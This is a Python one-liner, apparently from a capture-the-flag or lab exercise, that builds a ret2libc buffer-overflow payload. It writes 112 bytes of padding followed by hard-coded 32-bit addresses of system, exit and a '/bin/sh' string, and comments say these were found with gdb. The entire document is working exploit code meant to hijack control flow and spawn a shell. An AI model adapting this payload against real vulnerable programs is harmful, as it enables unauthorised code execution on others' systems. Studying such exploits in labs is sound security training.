python3 -c '
import sys
from struct import pack # this makes easier to write addresses on little indian format

payload = b"A" * 112 # padding
payload += pack("<I", 0xf7e15360) # system func address. obtained with print system (inside gdb ret2libc)
payload += pack("<I", 0xf7e07ec0) # exit func address. obtained with print exit
payload += pack("<I", 0xf7f60363) # /bin/sh string address. obtained with grep "/bin/sh" (inside gdb ret2libc)
sys.stdout.buffer.write(payload)
'
